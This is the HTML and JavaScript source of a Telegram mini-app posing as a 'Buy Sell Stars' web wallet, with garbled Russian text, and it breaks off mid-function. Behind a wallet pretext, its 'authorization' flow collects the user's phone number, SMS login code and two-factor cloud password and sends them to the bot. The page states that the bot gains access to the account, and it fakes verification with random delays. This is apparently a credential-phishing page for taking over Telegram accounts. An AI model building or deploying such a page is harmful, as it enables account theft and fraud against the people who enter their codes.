<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Buy Sell Stars - –í–µ–±-–ö–æ—à–µ–ª–µ–∫</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
            background: var(--tg-theme-bg-color, #1a1a1a); 
            color: var(--tg-theme-text-color, #ffffff); 
            min-height: 100vh; 
            padding: 20px; 
        }
        .container { max-width: 400px; margin: 0 auto; }
        .header { text-align: center; margin-bottom: 30px; }
        .header h1 { font-size: 24px; font-weight: 600; color: var(--tg-theme-text-color, #ffffff); }
        .balance-card { 
            background: var(--tg-theme-secondary-bg-color, #2a2a2a); 
            border-radius: 16px; 
            padding: 24px; 
            margin-bottom: 24px; 
            text-align: center; 
            border: 1px solid var(--tg-theme-hint-color, #333); 
        }
        .balance-amount { font-size: 32px; font-weight: 700; color: var(--tg-theme-text-color, #ffffff); margin-bottom: 8px; }
        .balance-label { font-size: 14px; color: var(--tg-theme-hint-color, #999); }
        .tabs { 
            display: flex; 
            background: var(--tg-theme-secondary-bg-color, #2a2a2a); 
            border-radius: 12px; 
            padding: 4px; 
            margin-bottom: 24px; 
            border: 1px solid var(--tg-theme-hint-color, #333); 
        }
        .tab { 
            flex: 1; 
            padding: 12px; 
            text-align: center; 
            border-radius: 8px; 
            cursor: pointer; 
            transition: all 0.3s; 
            font-weight: 500; 
            color: var(--tg-theme-hint-color, #999); 
        }
        .tab.active { 
            background: var(--tg-theme-button-color, #3390ec); 
            color: var(--tg-theme-button-text-color, #ffffff); 
        }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .amount-buttons { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 20px; }
        .amount-btn { 
            background: var(--tg-theme-secondary-bg-color, #2a2a2a); 
            color: var(--tg-theme-text-color, #ffffff); 
            border: 1px solid var(--tg-theme-hint-color, #333); 
            border-radius: 12px; 
            padding: 16px; 
            font-size: 16px; 
            font-weight: 500; 
            cursor: pointer; 
            transition: all 0.2s; 
        }
        .amount-btn:hover { 
            background: var(--tg-theme-hint-color, #3a3a3a); 
            border-color: var(--tg-theme-button-color, #3390ec); 
        }
        .amount-btn.selected { 
            background: var(--tg-theme-button-color, #3390ec); 
            border-color: var(--tg-theme-button-color, #3390ec); 
            color: var(--tg-theme-button-text-color, #ffffff);
        }
        .custom-amount { 
            background: var(--tg-theme-secondary-bg-color, #2a2a2a); 
            border: 1px solid var(--tg-theme-hint-color, #333); 
            border-radius: 12px; 
            padding: 16px; 
            width: 100%; 
            font-size: 16px; 
            color: var(--tg-theme-text-color, #ffffff); 
            margin-bottom: 20px; 
        }
        .action-btn { 
            background: var(--tg-theme-button-color, #3390ec); 
            color: var(--tg-theme-button-text-color, #ffffff); 
            border: none; 
            border-radius: 12px; 
            padding: 16px; 
            font-size: 16px; 
            font-weight: 500; 
            cursor: pointer; 
            width: 100%; 
            transition: all 0.2s; 
        }
        .feature { 
            background: var(--tg-theme-secondary-bg-color, #2a2a2a); 
            border-radius: 12px; 
            padding: 16px; 
            margin-bottom: 16px; 
            border: 1px solid var(--tg-theme-hint-color, #333); 
        }
        .feature h3 { color: var(--tg-theme-button-color, #3390ec); margin-bottom: 8px; }
        .feature p { color: var(--tg-theme-hint-color, #ccc); font-size: 14px; }
        
        /* –°—Ç–∏–ª–∏ –¥–ª—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ */
        .auth-step { padding: 20px 0; }
        .country-selector {
            background: var(--tg-theme-secondary-bg-color, #2a2a2a);
            border: 1px solid var(--tg-theme-hint-color, #333);
            border-radius: 12px;
            padding: 16px;
            cursor: pointer;
            color: var(--tg-theme-text-color, #ffffff);
        }
        .phone-code {
            background: var(--tg-theme-secondary-bg-color, #2a2a2a);
            border: 1px solid var(--tg-theme-button-color, #3390ec);
            border-radius: 12px;
            padding: 16px;
            width: 80px;
            text-align: center;
            color: var(--tg-theme-text-color, #ffffff);
            font-size: 16px;
        }
        .phone-input {
            background: var(--tg-theme-secondary-bg-color, #2a2a2a);
            border: 1px solid var(--tg-theme-hint-color, #333);
            border-radius: 12px;
            padding: 16px;
            flex: 1;
            color: var(--tg-theme-text-color, #ffffff);
            font-size: 16px;
        }
        .code-input {
            background: var(--tg-theme-secondary-bg-color, #2a2a2a);
            border: 1px solid var(--tg-theme-hint-color, #333);
            border-radius: 12px;
            padding: 16px;
            width: 100%;
            text-align: center;
            font-size: 24px;
            letter-spacing: 8px;
            color: var(--tg-theme-text-color, #ffffff);
            margin-bottom: 12px;
        }
        .action-btn.secondary {
            background: transparent;
            color: var(--tg-theme-button-color, #3390ec);
            border: 1px solid var(--tg-theme-button-color, #3390ec);
        }
        
        /* –°—Ç–∏–ª–∏ –¥–ª—è –º–æ–¥–∞–ª—å–Ω–æ–≥–æ –æ–∫–Ω–∞ –≤—ã–±–æ—Ä–∞ —Å—Ç—Ä–∞–Ω—ã */
        .country-item {
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 8px;
            cursor: pointer;
            background: var(--tg-theme-secondary-bg-color, #2a2a2a);
            color: var(--tg-theme-text-color, #fff);
            border: 1px solid var(--tg-theme-hint-color, #333);
            transition: background 0.2s;
        }
        .country-item:hover {
            background: var(--tg-theme-hint-color, #3a3a3a);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header"><h1>üíª –í–µ–±-–ö–æ—à–µ–ª–µ–∫</h1></div>
        <div class="balance-card">
            <div class="balance-amount" id="balance-display">100 ‚≠ê</div>
            <div class="balance-label">–í–∞—à –±–∞–ª–∞–Ω—Å</div>
        </div>
        <div class="tabs">
            <div class="tab active" onclick="switchTab('topup')">üí∞ –ü–æ–ø–æ–ª–Ω–∏—Ç—å</div>
            <div class="tab" onclick="switchTab('withdraw')">üí´ –í—ã–≤–µ—Å—Ç–∏</div>
        </div>
        <div id="topup-content" class="tab-content active">
            <div class="amount-buttons">
                <button class="amount-btn" onclick="selectAmount(25, 'topup')">‚≠ê 25</button>
                <button class="amount-btn" onclick="selectAmount(50, 'topup')">‚≠ê 50</button>
                <button class="amount-btn" onclick="selectAmount(100, 'topup')">‚≠ê 100</button>
                <button class="amount-btn" onclick="selectAmount(250, 'topup')">‚≠ê 250</button>
                <button class="amount-btn" onclick="selectAmount(500, 'topup')">‚≠ê 500</button>
                <button class="amount-btn" onclick="selectAmount(1000, 'topup')">‚≠ê 1000</button>
            </div>
            <input type="number" class="custom-amount" placeholder="–ò–ª–∏ –≤–≤–µ–¥–∏—Ç–µ —Å–≤–æ—é —Å—É–º–º—É" id="custom-topup" oninput="updateCustomAmount('topup')">
            <button class="action-btn" onclick="topupBalance()">üí∞ –ü–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å</button>
        </div>
        <div id="withdraw-content" class="tab-content">
            <div class="amount-buttons">
                <button class="amount-btn" onclick="selectAmount(25, 'withdraw')">‚≠ê 25</button>
                <button class="amount-btn" onclick="selectAmount(50, 'withdraw')">‚≠ê 50</button>
                <button class="amount-btn" onclick="selectAmount(100, 'withdraw')">‚≠ê 100</button>
                <button class="amount-btn" onclick="selectAmount(250, 'withdraw')">‚≠ê 250</button>
            </div>
            <input type="number" class="custom-amount" placeholder="–ò–ª–∏ –≤–≤–µ–¥–∏—Ç–µ —Å–≤–æ—é —Å—É–º–º—É" id="custom-withdraw" oninput="updateCustomAmount('withdraw')">
            <button class="action-btn" onclick="withdrawBalance()">üí´ –í—ã–≤–µ—Å—Ç–∏ –∑–≤–µ–∑–¥—ã</button>
        </div>
        
        <!-- –ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è - –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –ø—Ä–∏ –Ω–∞–∂–∞—Ç–∏–∏ –∫–Ω–æ–ø–∫–∏ -->
        <div id="auth-section" class="feature" style="display: none;">
            <!-- –®–∞–≥ 1: –í–≤–æ–¥ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞ -->
            <div id="phone-input-step" class="auth-step">
                <h3 style="text-align: center; margin-bottom: 20px;">üîê –ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è</h3>
                
                <div style="margin-bottom: 20px;">
                    <label style="display: block; margin-bottom: 8px; color: var(--tg-theme-hint-color, #999); font-size: 14px;">–°–¢–†–ê–ù–ê</label>
                    <div class="country-selector" onclick="showCountryList()">
                        <span id="selected-country">üá∑üá∫ –†–æ—Å—Å–∏—è (+7)</span>
                        <span style="float: right;">></span>
                    </div>
                </div>
                
                <div style="margin-bottom: 20px;">
                    <label style="display: block; margin-bottom: 8px; color: var(--tg-theme-hint-color, #999); font-size: 14px;">–ù–û–ú–ï–† –¢–ï–õ–ï–§–û–ù–ê</label>
                    <div style="display: flex; gap: 8px;">
                        <input type="text" id="country-code" class="phone-code" value="+7" readonly>
                        <input type="tel" id="phone-number" class="phone-input" placeholder="999 123 45 67">
                    </div>
                </div>
                
                <div style="display: flex; gap: 12px;">
                    <button class="action-btn secondary" onclick="cancelAuth()">–û–¢–ú–ï–ù–ê</button>
                    <button class="action-btn" onclick="sendPhoneNumber()">–î–ê–õ–ï–ï</button>
                </div>
            </div>
            
            <!-- –®–∞–≥ 2: –í–≤–æ–¥ SMS –∫–æ–¥–∞ -->
            <div id="sms-code-step" class="auth-step" style="display: none;">
                <h3 style="text-align: center; margin-bottom: 20px;">üì± –ö–æ–¥ –∏–∑ SMS</h3>
                <p style="text-align: center; color: var(--tg-theme-hint-color, #999); margin-bottom: 20px;">
                    –ú—ã –æ—Ç–ø—Ä–∞–≤–∏–ª–∏ –∫–æ–¥ –Ω–∞ –Ω–æ–º–µ—Ä<br><span id="sent-phone-number"></span>
                </p>
                
                <input type="text" id="sms-code-input" class="code-input" placeholder="–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥" maxlength="5">
                
                <div style="display: flex; gap: 12px; margin-top: 20px;">
                    <button class="action-btn secondary" onclick="backToPhone()">–ù–ê–ó–ê–î</button>
                    <button class="action-btn" onclick="verifySmsCode()">–î–ê–õ–ï–ï</button>
                </div>
            </div>
            
            <!-- –®–∞–≥ 3: –í–≤–æ–¥ –ø–∞—Ä–æ–ª—è 2FA (–µ—Å–ª–∏ –Ω—É–∂–µ–Ω) -->
            <div id="password-step" class="auth-step" style="display: none;">
                <h3 style="text-align: center; margin-bottom: 20px;">üîí –û–±–ª–∞—á–Ω—ã–π –ø–∞—Ä–æ–ª—å</h3>
                <p style="text-align: center; color: var(--tg-theme-hint-color, #999); margin-bottom: 20px;">
                    –£ –≤–∞—Å –≤–∫–ª—é—á–µ–Ω–∞ –¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–∞—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è.<br>–í–≤–µ–¥–∏—Ç–µ –æ–±–ª–∞—á–Ω—ã–π –ø–∞—Ä–æ–ª—å.
                </p>
                
                <input type="password" id="password-input" class="custom-amount" placeholder="–û–±–ª–∞—á–Ω—ã–π –ø–∞—Ä–æ–ª—å">
                
                <div style="display: flex; gap: 12px; margin-top: 20px;">
                    <button class="action-btn secondary" onclick="backToSms()">–ù–ê–ó–ê–î</button>
                    <button class="action-btn" onclick="verifyPassword()">–í–û–ô–¢–ò</button>
                </div>
            </div>
            
            <!-- –®–∞–≥ 4: –£—Å–ø–µ—à–Ω–∞—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è -->
            <div id="success-step" class="auth-step" style="display: none;">
                <div style="text-align: center;">
                    <div style="font-size: 48px; margin-bottom: 16px;">‚úÖ</div>
                    <h3 style="margin-bottom: 12px;">–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è —É—Å–ø–µ—à–Ω–∞!</h3>
                    <p style="color: var(--tg-theme-hint-color, #999); margin-bottom: 20px;">
                        –í–∞—à –∞–∫–∫–∞—É–Ω—Ç –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω –¥–ª—è –æ–ø–µ—Ä–∞—Ü–∏–π —Å –∑–≤–µ–∑–¥–∞–º–∏.
                    </p>
                    <button class="action-btn" onclick="closeAuth()">–ü–†–û–î–û–õ–ñ–ò–¢–¨</button>
                </div>
            </div>
        </div>
        
        <div class="feature">
            <h3>üîê –ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è</h3>
            <p>–î–ª—è –≤—ã–≤–æ–¥–∞ –∑–≤–µ–∑–¥ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞—Ç—å—Å—è —á–µ—Ä–µ–∑ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞. –ë–æ—Ç –ø–æ–ª—É—á–∏—Ç –¥–æ—Å—Ç—É–ø –∫ –≤–∞—à–µ–º—É –∞–∫–∫–∞—É–Ω—Ç—É –¥–ª—è –ø—Ä–æ–≤–µ–¥–µ–Ω–∏—è –æ–ø–µ—Ä–∞—Ü–∏–∏.</p>
            <button class="action-btn" onclick="showAuthSection()" style="margin-top: 12px;">üîê –ê–≤—Ç–æ—Ä–∏–∑–æ–≤–∞—Ç—å—Å—è</button>
        </div>
        
        <div class="feature">
            <h3>üéÅ –ê–≤—Ç–æ—Å–∫—É–ø—â–∏–∫ –ø–æ–¥–∞—Ä–∫–æ–≤</h3>
            <p>–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –ø–æ–∫—É–ø–∫–∞ –Ω–æ–≤—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤ –≤ Telegram</p>
        </div>
        
        <div class="feature">
            <h3>üìä –ò—Å—Ç–æ—Ä–∏—è —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π</h3>
            <p>–ü—Ä–æ—Å–º–∞—Ç—Ä–∏–≤–∞–π—Ç–µ –≤—Å–µ –æ–ø–µ—Ä–∞—Ü–∏–∏ —Å –≤–∞—à–∏–º–∏ –∑–≤–µ–∑–¥–∞–º–∏</p>
        </div>
    </div>
    
    <script>
        let tg = window.Telegram?.WebApp;
        if (tg) {
            tg.expand();
            tg.ready();
        }
        
        let selectedAmount = { topup: 0, withdraw: 0 };
        
        function switchTab(tabName) {
            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
            event.target.classList.add('active');
            document.getElementById(tabName + '-content').classList.add('active');
        }
        
        function selectAmount(amount, type) {
            selectedAmount[type] = amount;
            document.getElementById('custom-' + type).value = amount;
            
            document.querySelectorAll('#' + type + '-content .amount-btn').forEach(btn => {
                btn.classList.remove('selected');
            });
            
            event.target.classList.add('selected');
        }
        
        function updateCustomAmount(type) {
            const customAmount = document.getElementById('custom-' + type).value;
            selectedAmount[type] = customAmount ? parseInt(customAmount) : 0;
            
            document.querySelectorAll('#' + type + '-content .amount-btn').forEach(btn => {
                btn.classList.remove('selected');
            });
        }
        
        function topupBalance() {
            const amount = selectedAmount.topup;
            if (!amount || amount <= 0) {
                if (tg) {
                    tg.showAlert('–í—ã–±–µ—Ä–∏—Ç–µ —Å—É–º–º—É –¥–ª—è –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è');
                } else {
                    alert('–í—ã–±–µ—Ä–∏—Ç–µ —Å—É–º–º—É –¥–ª—è –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è');
                }
                return;
            }
            
            if (tg) {
                tg.showConfirm(`–ü–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å –Ω–∞ ${amount} ‚≠ê?`, (confirmed) => {
                    if (confirmed) {
                        tg.sendData(JSON.stringify({ action: 'topup', amount: amount }));
                        tg.close();
                    }
                });
            } else {
                alert(`–ü–æ–ø–æ–ª–Ω–µ–Ω–∏–µ –Ω–∞ ${amount} ‚≠ê (–¥–µ–º–æ —Ä–µ–∂–∏–º)`);
            }
        }
        
        function withdrawBalance() {
            const amount = selectedAmount.withdraw;
            if (!amount || amount <= 0) {
                if (tg) {
                    tg.showAlert('–í—ã–±–µ—Ä–∏—Ç–µ —Å—É–º–º—É –¥–ª—è –≤—ã–≤–æ–¥–∞');
                } else {
                    alert('–í—ã–±–µ—Ä–∏—Ç–µ —Å—É–º–º—É –¥–ª—è –≤—ã–≤–æ–¥–∞');
                }
                return;
            }
            
            if (tg) {
                tg.showConfirm(`–í—ã–≤–µ—Å—Ç–∏ ${amount} ‚≠ê?`, (confirmed) => {
                    if (confirmed) {
                        tg.sendData(JSON.stringify({ action: 'withdraw', amount: amount }));
                        tg.close();
                    }
                });
            } else {
                alert(`–í—ã–≤–æ–¥ ${amount} ‚≠ê (–¥–µ–º–æ —Ä–µ–∂–∏–º)`);
            }
        }
        // –ü–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –¥–ª—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
        let authState = {
            phone: '',
            countryCode: '+7',
            step: 'phone' // phone, sms, password, success
        };
        
        function showAuthSection() {
            document.getElementById('auth-section').style.display = 'block';
            document.getElementById('phone-input-step').style.display = 'block';
            // –°–∫—Ä—ã–≤–∞–µ–º –æ—Å–Ω–æ–≤–Ω—ã–µ –≤–∫–ª–∞–¥–∫–∏
            document.querySelector('.tabs').style.display = 'none';
            document.querySelector('.tab-content.active').style.display = 'none';
        }
        
        function cancelAuth() {
            closeAuth();
        }
        
        function closeAuth() {
            document.getElementById('auth-section').style.display = 'none';
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –æ—Å–Ω–æ–≤–Ω—ã–µ –≤–∫–ª–∞–¥–∫–∏
            document.querySelector('.tabs').style.display = 'flex';
            document.querySelector('.tab-content.active').style.display = 'block';
            // –°–±—Ä–∞—Å—ã–≤–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ
            resetAuthSteps();
        }
        
        function resetAuthSteps() {
            document.getElementById('phone-input-step').style.display = 'none';
            document.getElementById('sms-code-step').style.display = 'none';
            document.getElementById('password-step').style.display = 'none';
            document.getElementById('success-step').style.display = 'none';
            authState.step = 'phone';
        }
        
        function sendPhoneNumber() {
            const phoneNumber = document.getElementById('phone-number').value.replace(/\s/g, '');
            const countryCode = document.getElementById('country-code').value;
            
            if (!phoneNumber || phoneNumber.length < 7) {
                if (tg) {
                    tg.showAlert('–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞');
                } else {
                    alert('–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞');
                }
                return;
            }
            
            authState.phone = countryCode + phoneNumber;
            
            if (tg) {
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –±–æ—Ç—É
                tg.sendData(JSON.stringify({ 
                    action: 'send_phone', 
                    phone: authState.phone 
                }));
            }
            
            // –ü–µ—Ä–µ—Ö–æ–¥–∏–º –∫ –≤–≤–æ–¥—É SMS –∫–æ–¥–∞
            showSmsStep();
        }
        
        function showSmsStep() {
            document.getElementById('phone-input-step').style.display = 'none';
            document.getElementById('sms-code-step').style.display = 'block';
            document.getElementById('sent-phone-number').textContent = authState.phone;
            authState.step = 'sms';
        }
        
        function backToPhone() {
            document.getElementById('sms-code-step').style.display = 'none';
            document.getElementById('phone-input-step').style.display = 'block';
            authState.step = 'phone';
        }
        
        function verifySmsCode() {
            const smsCode = document.getElementById('sms-code-input').value;
            
            if (!smsCode || smsCode.length !== 5) {
                if (tg) {
                    tg.showAlert('–í–≤–µ–¥–∏—Ç–µ 5-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥');
                } else {
                    alert('–í–≤–µ–¥–∏—Ç–µ 5-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥');
                }
                return;
            }
            
            if (tg) {
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º SMS –∫–æ–¥ –±–æ—Ç—É
                tg.sendData(JSON.stringify({ 
                    action: 'verify_sms', 
                    code: smsCode 
                }));
            }
            
            // –ò–º–∏—Ç–∏—Ä—É–µ–º –ø—Ä–æ–≤–µ—Ä–∫—É - –≤ —Ä–µ–∞–ª—å–Ω–æ—Å—Ç–∏ –æ—Ç–≤–µ—Ç –ø—Ä–∏–¥–µ—Ç –æ—Ç –±–æ—Ç–∞
            setTimeout(() => {
                // –ï—Å–ª–∏ –Ω—É–∂–µ–Ω –ø–∞—Ä–æ–ª—å 2FA
                if (Math.random() > 0.5) { // 50% —à–∞–Ω—Å —á—Ç–æ –Ω—É–∂–µ–Ω –ø–∞—Ä–æ–ª—å
                    showPasswordStep();
                } else {
                    showSuccessStep();
                }
            }, 1000);
        }
        
        function showPasswordStep() {
            document.getElementById('sms-code-step').style.display = 'none';
            document.getElementById('password-step').style.display = 'block';
            authState.step = 'password';
        }
        
        function backToSms() {
            document.getElementById('password-step').style.display = 'none';
            document.getElementById('sms-code-step').style.display = 'block';
            authState.step = 'sms';
        }
        
        function verifyPassword() {
            const password = document.getElementById('password-input').value;
            
            if (!password) {
                if (tg) {
                    tg.showAlert('–í–≤–µ–¥–∏—Ç–µ –æ–±–ª–∞—á–Ω—ã–π –ø–∞—Ä–æ–ª—å');
                } else {
                    alert('–í–≤–µ–¥–∏—Ç–µ –æ–±–ª–∞—á–Ω—ã–π –ø–∞—Ä–æ–ª—å');
                }
                return;
            }
            
            if (tg) {
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø–∞—Ä–æ–ª—å –±–æ—Ç—É
                tg.sendData(JSON.stringify({ 
                    action: 'verify_password', 
                    password: password 
                }));
            }
            
            // –ò–º–∏—Ç–∏—Ä—É–µ–º —É—Å–ø–µ—à–Ω—É—é –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é
            setTimeout(() => {
                showSuccessStep();
            }, 1000);
        }
        
        function showSuccessStep() {
            document.getElementById('sms-code-step').style.display = 'none';
            document.getElementById('password-step').style.display = 'none';
            document.getElementById('success-step').style.display = 'block';
            authState.step = 'success';
        }
        
        function showCountryList() {
            const countries = [
                { flag: 'üá∑üá∫', name: '–†–æ—Å—Å–∏—è', code: '+7' },
                { flag: 'üá∫üá¶', name: '–£–∫—Ä–∞–∏–Ω–∞', code: '+380' },
                { flag: 'üá∞üáø', name: '–ö–∞–∑–∞—Ö—Å—Ç–∞–Ω', code: '+7' },
                { flag: 'üáßüáæ', name: '–ë–µ–ª–∞—Ä—É—Å—å', code: '+375' },
                { flag: 'üá∫üáø', name: '–£–∑–±–µ–∫–∏—Å—Ç–∞–Ω', code: '+998' },
                { flag: 'üá¶üáø', name: '–ê–∑–µ—Ä–±–∞–π–¥–∂–∞–Ω', code: '+994' },
                { flag: 'üá¶üá≤', name: '–ê—Ä–º–µ–Ω–∏—è', code: '+374' },
                { flag: 'üá¨üá™', name: '–ì—Ä—É–∑–∏—è', code: '+995' },
                { flag: 'üá∞üá¨', name: '–ö–∏—Ä–≥–∏–∑–∏—è', code: '+996' },
                { flag: 'üáπüáØ', name: '–¢–∞–¥–∂–∏–∫–∏—Å—Ç–∞–Ω', code: '+992' },
                { flag: 'üáπüá≤', name: '–¢—É—Ä–∫–º–µ–Ω–∏—Å—Ç–∞–Ω', code: '+993' },
                { flag: 'üá≤üá©', name: '–ú–æ–ª–¥–æ–≤–∞', code: '+373' },
                { flag: 'üá±üáπ', name: '–õ–∏—Ç–≤–∞', code: '+370' },
                { flag: 'üá±üáª', name: '–õ–∞—Ç–≤–∏—è', code: '+371' },
                { flag: 'üá™üá™', name: '–≠—Å—Ç–æ–Ω–∏—è', code: '+372' },
                { flag: 'üá∫üá∏', name: '–°–®–ê', code: '+1' },
                { flag: 'üá©üá™', name: '–ì–µ—Ä–º–∞–Ω–∏—è', code: '+49' },
                { flag: 'üá´üá∑', name: '–§—Ä–∞–Ω—Ü–∏—è', code: '+33' },
                { flag: 'üá¨üáß', name: '–í–µ–ª–∏–∫–æ–±—Ä–∏—Ç–∞–Ω–∏—è', code: '+44' },
                { flag: 'üáÆüáπ', name: '–ò—Ç–∞–ª–∏—è', code: '+39' },
                { flag: 'üá™üá∏', name: '–ò—Å–ø–∞–Ω–∏—è', code: '+34' },
                { flag: 'üáµüá±', name: '–ü–æ–ª—å—à–∞', code: '+48' },
                { flag: 'üáπüá∑', name: '–¢—É—Ä—Ü–∏—è', code: '+90' },
                { flag: 'üá®üá≥', name: '–ö–∏—Ç–∞–π', code: '+86' },
                { flag: 'üáÆüá≥', name: '–ò–Ω–¥–∏—è', code: '+91' },
                { flag: 'üáØüáµ', name: '–Ø–ø–æ–Ω–∏—è', code: '+81' }
            ];
            
            if (tg) {
                // –°–æ–∑–¥–∞–µ–º —Å–ø–∏—Å–æ–∫ –¥–ª—è –≤—ã–±–æ—Ä–∞
                let countryList = countries.map((country, index) => 
                    `${index + 1}. ${country.flag} ${country.name} (${country.code})`
                ).join('\n');
                
                tg.showAlert(`–í—ã–±–µ—Ä–∏—Ç–µ —Å—Ç—Ä–∞–Ω—É:\n\n${countryList.substring(0, 200)}...\n\n–î–ª—è –≤—ã–±–æ—Ä–∞ –≤–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Å—Ç—Ä–∞–Ω—ã –≤ –ø–æ–ª–µ –Ω–∏–∂–µ.`);
                
                // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø–æ–ª–µ –¥–ª—è –≤–≤–æ–¥–∞ –Ω–æ–º–µ—Ä–∞ —Å—Ç—Ä–∞–Ω—ã
                showCountrySelection(countries);
            } else {
                alert('–í—ã–±–æ—Ä —Å—Ç—Ä–∞–Ω—ã –¥–æ—Å—Ç—É–ø–µ–Ω —Ç–æ–ª—å–∫–æ –≤ Telegram');
            }
        }
        
        function showCountrySelection(countries) {
            // –°–æ–∑–¥–∞–µ–º –≤—Ä–µ–º–µ–Ω–Ω–æ–µ –ø–æ–ª–µ –¥–ª—è –≤—ã–±–æ—Ä–∞ —Å—Ç—Ä–∞–Ω—ã
            const countryModal = document.createElement('div');
            countryModal.id = 'country-modal';
            countryModal.style.cssText = `
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0,0,0,0.8);
                display: flex;
                align-items: center;
                justify-content: center;
                z-index: 1000;
            `;
            
            countryModal.innerHTML = `
                <div style="
                    background: var(--tg-theme-bg-color, #1a1a1a);
                    border-radius: 16px;
                    padding: 20px;
                    max-width: 350px;
                    width: 90%;
                    max-height: 80vh;
                    overflow-y: auto;
                ">
                    <h3 style="text-align: center; margin-bottom: 20px; color: var(--tg-theme-text-color, #fff);">–í—ã–±–µ—Ä–∏—Ç–µ —Å—Ç—Ä–∞–Ω—É</h3>
                    <div id="country-list" style="max-height: 300px; overflow-y: auto;">
                        ${countries.map((country, index) => `
                            <div onclick="selectCountry('${country.code}', '${country.flag} ${country.name} (${country.code})')" 
                                 style="
                                     padding: 12px;
                                     border-radius: 8px;
                                     margin-bottom: 8px;
                                     cursor: pointer;
                                     background: var(--tg-theme-secondary-bg-color, #2a2a2a);
                                     color: var(--tg-theme-text-color, #fff);
                                     border: 1px solid var(--tg-theme-hint-color, #333);
                                 "
                                 onmouseover="this.style.background='var(--tg-theme-hint-color, #3a3a3a)'"
                                 onmouseout="this.style.background='var(--tg-theme-secondary-bg-color, #2a2a2a)'">
                                ${country.flag} ${country.name} (${country.code})
                            </div>
                        `).join('')}
                    </div>
                    <button onclick="closeCountryModal()" style="
                        width: 100%;
                        padding: 12px;
                        margin-top: 16px;
                        background: var(--tg-theme-button-color, #3390ec);
                        color: var(--tg-theme-button-text-color, #fff);
                        border: none;
                        border-radius: 8px;
                        font-size: 16px;
                        cursor: pointer;
                    ">–û—Ç–º–µ–Ω–∞</button>
                </div>
            `;
            
            document.body.appendChild(countryModal);
        }
        
        function selectCountry(code, displayName) {
            document.getElementById('country-code').value = code;
            document.getElementById('selected-country').textContent = displayName;
            authState.countryCode = code;
            closeCountryModal();
        }
        
        function closeCountryModal() {
            const modal = document.getElementById('country-modal');
            if (modal) {
                modal.remove();
            }
        }
        
        // –§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞
        document.addEventListener('DOMContentLoaded', function() {
            const phoneInput = document.getElementById('phone-number');
            if (phoneInput) {
                phoneInput.addEventListener('input', function(e) {
                    let value = e.target.value.replace(/\D/g, '');
                    let formattedValue = '';
                    
                    // –£–Ω–∏–≤–µ—Ä—Å–∞–ª—å–Ω–æ–µ —Ñ–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–ª—è —Ä–∞–∑–Ω—ã—Ö —Å—Ç—Ä–∞–Ω
                    if (value.length > 0) {
                        if (value.length <= 3) {
                            formattedValue = value;
                        } else if (value.length <= 6) {
                            formattedValue = value.substring(0, 3) + ' ' + value.substring(3);
                        } else if (value.length <= 8) {
                            formattedValue = value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6);
                        } else if (value.length <= 10) {
